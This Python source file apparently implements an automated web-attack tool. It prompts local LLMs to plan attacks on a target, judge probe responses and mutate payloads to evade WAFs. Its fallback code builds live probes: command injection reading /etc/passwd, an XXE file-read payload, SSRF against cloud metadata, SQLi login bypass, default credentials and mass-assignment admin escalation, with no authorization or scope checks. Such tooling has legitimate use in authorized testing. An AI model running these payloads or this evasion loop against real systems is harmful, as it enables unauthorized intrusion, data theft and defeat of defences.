"""
CYPHEX DeepAttack Oracle — standalone Ollama-based attack reasoning.

Model routing:
  plan()   -> qwen2.5-coder:7b   (attack planning)
  decide() -> llama3.1:8b         (evidence analysis)
  mutate() -> deepseek-coder:6.7b (payload mutation)

Falls back to best single available model if any is missing.
Self-contained: calls Ollama directly, no external dependencies.
"""
import json
import os
import re
import asyncio
import httpx
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Any

# -- Model roles ----------------------------------------------------------------
_ROLE_PLANNER  = "qwen2.5-coder:7b"
_ROLE_ANALYST  = "llama3.1:8b"
_ROLE_MUTATOR  = "deepseek-coder:6.7b"
OLLAMA_BASE    = "http://localhost:11434"


async def _get_available_models() -> list[str]:
    """Query Ollama for locally available models."""
    try:
        async with httpx.AsyncClient(timeout=5.0) as client:
            r = await client.get(f"{OLLAMA_BASE}/api/tags")
            return [m["name"] for m in r.json().get("models", [])]
    except Exception:
        return []


_MODEL_CACHE: list[str] = []


async def _resolve_model(preferred: str) -> str:
    """Return preferred model if available, else best fallback."""
    global _MODEL_CACHE
    if not _MODEL_CACHE:
        _MODEL_CACHE = await _get_available_models()
    if preferred in _MODEL_CACHE:
        return preferred
    # Check partial match (e.g. "llama3.1:8b" matches "llama3.1:8b-instruct-q4_0")
    for m in _MODEL_CACHE:
        if preferred.split(":")[0] in m:
            return m
    # Fallback: pick first available model
    for m in _MODEL_CACHE:
        if m:
            return m
    return preferred  # Let Ollama throw its own error


# -- System prompts -------------------------------------------------------------

ORACLE_PLAN_SYSTEM = """\
You are CYPHEX DeepAttack Oracle — an elite offensive security reasoning engine.

Given observations about a web target, you:
1. Identify the most likely attack paths for the requested vulnerability class
2. Decompose into testable hypotheses — smallest falsifiable unit first
3. Order by: highest CVSS potential FIRST, cheapest/fastest test FIRST
4. Specify the exact HTTP request for each hypothesis
5. Define what response signals confirm vs reject each hypothesis

Rules:
- Use ONLY CWE numbers: CWE-89 (SQLi), CWE-79 (XSS), CWE-78 (CMDi), CWE-22 (Path Traversal),
  CWE-918 (SSRF), CWE-94 (SSTI), CWE-611 (XXE), CWE-287 (Auth), CWE-639 (IDOR)
- severity: Critical | High | Medium | Low
- Return ONLY valid JSON. No markdown. No preamble.

JSON schema:
{
  "target_summary": "<1 sentence>",
  "primary_vulnerability_class": "<SQLi|XSS|CMDi|...>",
  "hypotheses": [
    {
      "id": "h1",
      "vuln_type": "<specific technique e.g. Time-Based SQLi>",
      "cwe": "CWE-89",
      "severity": "Critical",
      "test_request": {
        "method": "GET",
        "path": "/api/users/search?q=",
        "body": "",
        "headers": {},
        "payload": "' OR SLEEP(5)--"
      },
      "confirm_signal": "response_time > 4.5 seconds",
      "reject_signal": "response_time < 1 second AND status != 500",
      "next_if_confirmed": "h2",
      "next_if_rejected": "h3"
    }
  ]
}
"""

ORACLE_DECIDE_SYSTEM = """\
You are CYPHEX DeepAttack Oracle.
Evaluate the HTTP response to a security probe and decide the next action.

Actions:
1. "confirmed" — The response unambiguously confirms the vulnerability.
2. "abandoned" — The target is clearly not vulnerable (WAF blocked, 404, static file).
3. "adapt"     — The probe failed but vulnerability is still plausible. Provide a mutated probe.

Time-based detection rules:
- If response_time > 4.0s AND the payload contained a sleep/delay command -> strong indicator.
- If response_time < 0.5s AND payload contained SLEEP(5) -> likely not vulnerable.

Return ONLY valid JSON:
{
  "thinking": "<1-2 sentence reasoning>",
  "action": "confirmed|abandoned|adapt",
  "confidence": 85,
  "vuln": {
    "name": "<full vuln name>",
    "cwe": "CWE-89",
    "severity": "Critical",
    "evidence": "<exact snippet from response that confirms it>",
    "fix": "<1 sentence remediation>"
  },
  "next_probe": {
    "method": "GET",
    "path": "...",
    "body": "",
    "headers": {},
    "payload": "<mutated payload>"
  }
}
Note: 'vuln' only if action=confirmed. 'next_probe' only if action=adapt.
"""

ORACLE_MUTATE_SYSTEM = """\
You are a payload mutation engine for a penetration testing tool.
Given a payload that was blocked/failed, generate 5 semantically equivalent
bypass variants using WAF evasion techniques:
- URL/double encoding
- Null bytes, whitespace substitution
- Case variation, comment insertion
- Hex/Unicode encoding
- Alternative syntax for the same operation

Return ONLY valid JSON:
{
  "original": "<original payload>",
  "variants": [
    "<variant 1>",
    "<variant 2>",
    "<variant 3>",
    "<variant 4>",
    "<variant 5>"
  ],
  "technique": "<brief description of primary bypass technique used>"
}
"""


# -- Data models ----------------------------------------------------------------

@dataclass
class HttpRequest:
    method: str
    path: str
    body: str = ""
    headers: dict = field(default_factory=dict)
    payload: str = ""     # The specific injection string used

    def summary(self) -> str:
        return f"{self.method} {self.path}" + (f" [{self.payload[:40]}]" if self.payload else "")


@dataclass
class Hypothesis:
    id: str
    vuln_type: str
    cwe: str
    severity: str
    test_request: HttpRequest
    confirm_signal: str
    reject_signal: str
    next_if_confirmed: str = ""
    next_if_rejected: str = ""


@dataclass
class AttackPlan:
    target_summary: str
    primary_vulnerability_class: str
    hypotheses: List[Hypothesis]

    @classmethod
    def from_json(cls, data: dict) -> "AttackPlan":
        hypotheses = []
        for h in data.get("hypotheses", []):
            req = h.get("test_request", {})
            hypotheses.append(Hypothesis(
                id=h.get("id", ""),
                vuln_type=h.get("vuln_type", ""),
                cwe=h.get("cwe", ""),
                severity=h.get("severity", "Medium"),
                test_request=HttpRequest(
                    method=req.get("method", "GET"),
                    path=req.get("path", ""),
                    body=req.get("body", ""),
                    headers=req.get("headers", {}),
                    payload=req.get("payload", ""),
                ),
                confirm_signal=h.get("confirm_signal", ""),
                reject_signal=h.get("reject_signal", ""),
                next_if_confirmed=h.get("next_if_confirmed", ""),
                next_if_rejected=h.get("next_if_rejected", ""),
            ))
        return cls(
            target_summary=data.get("target_summary", ""),
            primary_vulnerability_class=data.get("primary_vulnerability_class", ""),
            hypotheses=hypotheses,
        )


@dataclass
class Decision:
    action: str           # confirmed | abandoned | adapt
    thinking: str
    confidence: int = 0   # 0-100
    vuln: dict = None
    next_probe: Optional[HttpRequest] = None

    @classmethod
    def from_json(cls, data: dict) -> "Decision":
        next_probe = None
        if data.get("next_probe"):
            req = data["next_probe"]
            next_probe = HttpRequest(
                method=req.get("method", "GET"),
                path=req.get("path", ""),
                body=req.get("body", ""),
                headers=req.get("headers", {}),
                payload=req.get("payload", ""),
            )
        return cls(
            action=data.get("action", "abandoned"),
            thinking=data.get("thinking", ""),
            confidence=int(data.get("confidence", 0)),
            vuln=data.get("vuln"),
            next_probe=next_probe,
        )


# -- Direct Ollama caller (enhanced with agent-reasoning when available) ------

# Try to use the agent-reasoning Oracle adapter for enhanced reasoning
_REASONER = None
try:
    import sys as _sys
    _sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(__file__)), "reasoning"))
    from oracle_adapter import get_reasoner
    _REASONER = get_reasoner()
except Exception:
    pass


async def _ollama_call(model: str, system: str, prompt: str,
                       task_type: str = "default", cwe: str = "") -> dict:
    """
    Call Ollama and return parsed JSON.
    
    When agent-reasoning is available, routes through the CyphexReasoner
    to enhance local models with cognitive strategies (CoT, ToT, etc.).
    Otherwise falls back to direct Ollama API calls.
    """
    import os as _os

    # -- Try agent-reasoning enhanced path first --
    if _REASONER and _REASONER.is_enhanced:
        try:
            resolved = await _resolve_model(model)
            # CRITICAL: _REASONER.generate() is synchronous (blocking Ollama HTTP call).
            # Without run_in_executor, calling this from asyncio.gather() in 3 parallel
            # agents blocks the event loop — only one agent runs at a time despite gather().
            # run_in_executor() moves it to a thread pool so all agents truly run in parallel.
            loop = asyncio.get_event_loop()
            result = await loop.run_in_executor(
                None,
                lambda: _REASONER.generate(
                    model=resolved,
                    prompt=prompt,
                    system=system,
                    task_type=task_type,
                    cwe=cwe,
                )
            )
            if result.response:
                print(f"  ◈ Agent-Reasoning: {result.strategy} strategy")
                print(f"  ◈ Reasoning complete ({result.strategy}, {result.duration_ms:.0f}ms)")
                
                # Parse JSON from response
                clean = re.sub(r"```(?:json)?|```", "", result.response).strip()
                try:
                    return json.loads(clean)
                except json.JSONDecodeError:
                    start = clean.find('{')
                    if start != -1:
                        depth = 0
                        in_str = False
                        i = start
                        while i < len(clean):
                            ch = clean[i]
                            if ch == '\\' and in_str:
                                i += 2
                                continue
                            if ch == '"':
                                in_str = not in_str
                            elif not in_str:
                                if ch == '{':
                                    depth += 1
                                elif ch == '}':
                                    depth -= 1
                                    if depth == 0:
                                        try:
                                            return json.loads(clean[start:i + 1])
                                        except json.JSONDecodeError:
                                            break
                            i += 1
                    return {}
        except Exception as e:
            print(f"  [Oracle] Agent-reasoning fallback: {repr(e)}")

    # -- Fallback: Direct Ollama API call --
    resolved = await _resolve_model(model)
    try:
        async with httpx.AsyncClient(timeout=httpx.Timeout(90.0, connect=10.0)) as client:
            r = await client.post(
                f"{OLLAMA_BASE}/api/chat",
                json={
                    "model": resolved,
                    "messages": [
                        {"role": "system", "content": system},
                        {"role": "user", "content": prompt},
                    ],
                    "stream": False,
                    "keep_alive": "10m",
                    "options": {
                        "temperature": 0.1,
                        "top_p": 0.9,
                        "num_ctx": 4096,
                        "num_predict": 4096,
                    }
                }
            )
            raw = r.json()["message"]["content"]

        # Strip markdown code fences
        clean = re.sub(r"```(?:json)?|```", "", raw).strip()
        try:
            return json.loads(clean)
        except json.JSONDecodeError:
            # Bracket-balanced extraction
            start = clean.find('{')
            if start == -1:
                return {}
            depth = 0
            in_str = False
            i = start
            while i < len(clean):
                ch = clean[i]
                if ch == '\\' and in_str:
                    i += 2
                    continue
                if ch == '"':
                    in_str = not in_str
                elif not in_str:
                    if ch == '{':
                        depth += 1
                    elif ch == '}':
                        depth -= 1
                        if depth == 0:
                            try:
                                return json.loads(clean[start:i + 1])
                            except json.JSONDecodeError:
                                return {}
                i += 1
            return {}
    except Exception as e:
        print(f"  [Oracle] Ollama call failed ({resolved}): {repr(e)}")
        return {}


# -- Oracle ---------------------------------------------------------------------

class AttackOracle:
    """
    Multi-model oracle for DeepAgent attack reasoning.
    Routes tasks to the most capable available local model.
    Enhanced with agent-reasoning cognitive strategies (CoT, ToT, etc.).
    """

    def __init__(self):
        pass  # No external dependencies needed

    async def plan(self, target: str, surface_summary: str,
                   vuln_class: str) -> AttackPlan:
        """Generate an ordered attack plan via the planner model."""
        prompt = (
            f"Target: {target}\n\n"
            f"Vulnerability class to test: {vuln_class}\n\n"
            f"Observed attack surface:\n{surface_summary}\n\n"
            "Generate a prioritised, hypothesis-driven attack plan with EXACTLY 3 hypotheses."
        )
        # Use CoT for planning — fast single-pass reasoning (~30s vs 500s for ToT)
        response = await _ollama_call(
            _ROLE_PLANNER, ORACLE_PLAN_SYSTEM, prompt,
            task_type="patch_generate", cwe=""
        )
        plan = AttackPlan.from_json(response)

        # ── Fallback: if LLM returned 0 hypotheses, generate static probe set ──
        if not plan.hypotheses:
            plan.hypotheses = self._generate_fallback_hypotheses(
                vuln_class, surface_summary, target
            )
        return plan

    def _generate_fallback_hypotheses(
        self, vuln_class: str, surface_summary: str, target: str
    ) -> List[Hypothesis]:
        """
        Static fallback hypotheses when the LLM produces zero.
        Parses real endpoints from the surface_summary and builds
        per-vuln-class probe requests against them.
        """
        import re as _re
        endpoints_found = _re.findall(r"(GET|POST|PUT|DELETE|PATCH)\s+(/\S+)", surface_summary)
        seen: Dict[str, str] = {}
        for method, path in endpoints_found:
            clean = path.rstrip(",;)")
            if clean not in seen:
                seen[clean] = method
        paths = list(seen.items())  # [(path, method)]
        if not paths:
            paths = [("/api/products/search", "GET"), ("/api/users/login", "POST")]

        vc = vuln_class.lower()
        hypotheses: List[Hypothesis] = []

        # ── SSRF ──────────────────────────────────────────────────────────────
        if "ssrf" in vc or "server-side request" in vc:
            ssrf_targets = ["http://127.0.0.1", "http://169.254.169.254/latest/meta-data/"]
            post_paths = [(p, m) for p, m in paths if m == "POST"]
            probe_path, probe_method = post_paths[0] if post_paths else (paths[0][0], "GET")
            for i, ssrf_url in enumerate(ssrf_targets):
                if probe_method == "POST":
                    hypotheses.append(Hypothesis(
                        id=f"fb_ssrf_{i+1}", vuln_type=f"SSRF via POST body (Attempt {i+1})",
                        cwe="CWE-918", severity="High",
                        test_request=HttpRequest(
                            method="POST", path=probe_path,
                            body=f"url={ssrf_url}",
                            headers={"Content-Type": "application/x-www-form-urlencoded"},
                            payload=ssrf_url,
                        ),
                        confirm_signal="response contains internal data or HTTP 200 from internal host",
                        reject_signal="HTTP 400/403/404 with no internal content",
                    ))
                else:
                    hypotheses.append(Hypothesis(
                        id=f"fb_ssrf_{i+1}", vuln_type=f"SSRF via GET param (Attempt {i+1})",
                        cwe="CWE-918", severity="High",
                        test_request=HttpRequest(
                            method="GET", path=f"{probe_path}?url={ssrf_url}", payload=ssrf_url,
                        ),
                        confirm_signal="response contains internal IP data or AWS metadata",
                        reject_signal="HTTP 400/403/404",
                    ))

        # ── CMDi ──────────────────────────────────────────────────────────────
        elif "cmdi" in vc or "command injection" in vc:
            cmdi_payloads = ["; whoami", "| id", "&& whoami", "$(id)", "; cat /etc/passwd"]
            get_paths = [(p, m) for p, m in paths if m == "GET"][:3]
            for i, (path, method) in enumerate(get_paths):
                payload = cmdi_payloads[i % len(cmdi_payloads)]
                probe_path = f"{path}{payload}" if "?" in path else f"{path}?cmd={payload}"
                hypotheses.append(Hypothesis(
                    id=f"fb_cmdi_{i+1}", vuln_type=f"CMDi via GET param (Attempt {i+1})",
                    cwe="CWE-78", severity="Critical",
                    test_request=HttpRequest(method="GET", path=probe_path, payload=payload),
                    confirm_signal="response contains 'root' OR 'uid=' OR OS username",
                    reject_signal="HTTP 400/403 with no OS output",
                ))

        # ── IDOR ──────────────────────────────────────────────────────────────
        elif "idor" in vc or "direct object" in vc:
            id_paths = [(p, m) for p, m in paths if ":id" in p or m == "GET"][:3]
            for i, (path, method) in enumerate(id_paths):
                clean_path = path.replace(":id", str(i + 1))
                hypotheses.append(Hypothesis(
                    id=f"fb_idor_{i+1}", vuln_type=f"IDOR Sequential ID (id={i+1})",
                    cwe="CWE-639", severity="High",
                    test_request=HttpRequest(method=method, path=f"{clean_path}", payload=str(i + 1)),
                    confirm_signal="HTTP 200 with user/order/resource data without auth",
                    reject_signal="HTTP 403/404",
                ))

        # ── SSTI ──────────────────────────────────────────────────────────────
        elif "ssti" in vc or "template injection" in vc:
            ssti_payloads = [("{{7*7}}", "49"), ("${7*7}", "49"), ("{$smarty.version}", "smarty")]
            get_paths = [(p, m) for p, m in paths if m == "GET"][:3]
            for i, (path, method) in enumerate(get_paths):
                payload, signal = ssti_payloads[i % len(ssti_payloads)]
                probe_path = f"{path}{payload}" if "?" in path else f"{path}?q={payload}"
                hypotheses.append(Hypothesis(
                    id=f"fb_ssti_{i+1}", vuln_type=f"SSTI probe {payload} (Attempt {i+1})",
                    cwe="CWE-94", severity="Critical",
                    test_request=HttpRequest(method=method, path=probe_path, payload=payload),
                    confirm_signal=f"response contains '{signal}' (evaluated expression)",
                    reject_signal="payload reflected literally without evaluation",
                ))

        # ── XXE ───────────────────────────────────────────────────────────────
        elif "xxe" in vc or "xml external" in vc:
            xxe_payload = (
                '<?xml version="1.0"?><!DOCTYPE foo '
                '[<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
            )
            post_paths = [(p, m) for p, m in paths if m == "POST"]
            if not post_paths:
                post_paths = [(paths[0][0], "POST")]
            for i, (path, _) in enumerate(post_paths[:2]):
                hypotheses.append(Hypothesis(
                    id=f"fb_xxe_{i+1}", vuln_type=f"XXE via XML body (Attempt {i+1})",
                    cwe="CWE-611", severity="High",
                    test_request=HttpRequest(
                        method="POST", path=path, body=xxe_payload,
                        headers={"Content-Type": "application/xml"}, payload="&xxe;",
                    ),
                    confirm_signal="response contains 'root:x:0' or filesystem content",
                    reject_signal="XML parse error or HTTP 400/415",
                ))

        # ── Auth ──────────────────────────────────────────────────────────────
        elif "auth" in vc or "authentication" in vc or "privilege" in vc:
            login_paths = [(p, m) for p, m in paths if any(
                kw in p.lower() for kw in ("login", "signin", "auth", "token")
            )]
            if not login_paths:
                login_paths = [("/api/users/login", "POST")]
            for i, (path, method) in enumerate(login_paths[:2]):
                for j, (u, p) in enumerate([("admin", "admin"), ("admin", "' OR '1'='1'--"), ("test", "test")]):
                    hypotheses.append(Hypothesis(
                        id=f"fb_auth_{i+1}_{j}", vuln_type=f"Auth Probe ({u}:{p[:20]})",
                        cwe="CWE-287", severity="Critical",
                        test_request=HttpRequest(
                            method="POST", path=path,
                            body=f'{{"username":"{u}","password":"{p}"}}',
                            headers={"Content-Type": "application/json"},
                            payload=f"{u}:{p}",
                        ),
                        confirm_signal="HTTP 200 with token/session OR user data returned",
                        reject_signal="HTTP 400/401/403",
                    ))
                    if len(hypotheses) >= 3:
                        break
                if len(hypotheses) >= 3:
                    break

        # ── Business Logic ────────────────────────────────────────────────────
        elif "business" in vc or "logic" in vc:
            order_paths = [(p, m) for p, m in paths if any(
                kw in p.lower() for kw in ("order", "cart", "coupon", "price", "checkout")
            )]
            probe = order_paths[0][0] if order_paths else "/api/orders/create"
            hypotheses += [
                Hypothesis(
                    id="fb_bl_1", vuln_type="Negative Quantity / Price Manipulation",
                    cwe="CWE-840", severity="High",
                    test_request=HttpRequest(
                        method="POST", path=probe,
                        body='{"product_id":1,"quantity":-1,"user_id":1}',
                        headers={"Content-Type": "application/json"}, payload="-1",
                    ),
                    confirm_signal="HTTP 200 with negative price or order created",
                    reject_signal="HTTP 400 with validation error",
                ),
                Hypothesis(
                    id="fb_bl_2", vuln_type="Mass Assignment — isAdmin escalation",
                    cwe="CWE-915", severity="High",
                    test_request=HttpRequest(
                        method="POST", path="/api/users/register",
                        body='{"username":"hacker99","password":"pass123","isAdmin":true,"role":"admin"}',
                        headers={"Content-Type": "application/json"}, payload="isAdmin=true",
                    ),
                    confirm_signal="HTTP 200 and admin role granted",
                    reject_signal="HTTP 400 or field ignored",
                ),
                Hypothesis(
                    id="fb_bl_3", vuln_type="CORS Origin Spoofing",
                    cwe="CWE-942", severity="Medium",
                    test_request=HttpRequest(
                        method="GET", path="/api/admin/users",
                        headers={"Origin": "https://evil.example.com"}, payload="evil-origin",
                    ),
                    confirm_signal="Access-Control-Allow-Origin echoes evil.example.com",
                    reject_signal="no CORS header or restrictive value",
                ),
            ]

        # ── Generic final fallback ────────────────────────────────────────────
        if not hypotheses:
            get_paths = [(p, m) for p, m in paths if m == "GET"][:3]
            for i, (path, method) in enumerate(get_paths):
                hypotheses.append(Hypothesis(
                    id=f"fb_generic_{i+1}", vuln_type=f"Generic {vuln_class} probe (Attempt {i+1})",
                    cwe="CWE-0", severity="Medium",
                    test_request=HttpRequest(method=method, path=f"{path}?probe={i}", payload=f"probe{i}"),
                    confirm_signal="unusual error or unexpected response behavior",
                    reject_signal="normal 200 response with expected content",
                ))

        return hypotheses[:5]

    async def decide(self, hypothesis: Hypothesis, response_status: int,
                     response_body: str, response_time: float,
                     attempt: int, baseline_time: float = 0.0) -> Decision:
        """Evaluate a probe response and decide the next action."""
        time_analysis = ""
        if baseline_time > 0:
            delta = response_time - baseline_time
            time_analysis = (
                f"Baseline response time: {baseline_time:.2f}s\n"
                f"Probe response time: {response_time:.2f}s\n"
                f"Delta: {delta:+.2f}s (significant if >3.0s for sleep payloads)\n"
            )

        prompt = (
            f"Hypothesis: {hypothesis.vuln_type} at {hypothesis.test_request.path}\n"
            f"Attempt: {attempt + 1}\n"
            f"Test sent: {hypothesis.test_request.summary()}\n"
            f"Payload used: {hypothesis.test_request.payload}\n"
            f"Response: HTTP {response_status}, {len(response_body)} bytes, {response_time:.2f}s\n"
            f"{time_analysis}"
            f"Response body (first 800 chars):\n{response_body[:800]}\n\n"
            f"Confirmation signal: {hypothesis.confirm_signal}\n"
            f"Rejection signal: {hypothesis.reject_signal}\n\n"
            "Decide: confirmed / adapt (provide next probe) / abandoned"
        )
        # Use CoT for analysis — fast step-by-step evidence evaluation (~30s)
        response = await _ollama_call(
            _ROLE_ANALYST, ORACLE_DECIDE_SYSTEM, prompt,
            task_type="default", cwe=""
        )
        return Decision.from_json(response)

    async def mutate(self, payload: str, vuln_class: str,
                     reason: str = "blocked") -> list[str]:
        """Generate WAF-bypass variants of a failed payload."""
        prompt = (
            f"Vulnerability class: {vuln_class}\n"
            f"Failed payload: {payload}\n"
            f"Failure reason: {reason}\n\n"
            "Generate 5 bypass variants of this payload."
        )
        try:
            # Use CoT for mutation — fast single-pass payload generation (~30s)
            response = await _ollama_call(
                _ROLE_MUTATOR, ORACLE_MUTATE_SYSTEM, prompt,
                task_type="default", cwe=""
            )
            return response.get("variants", [])
        except Exception:
            return []

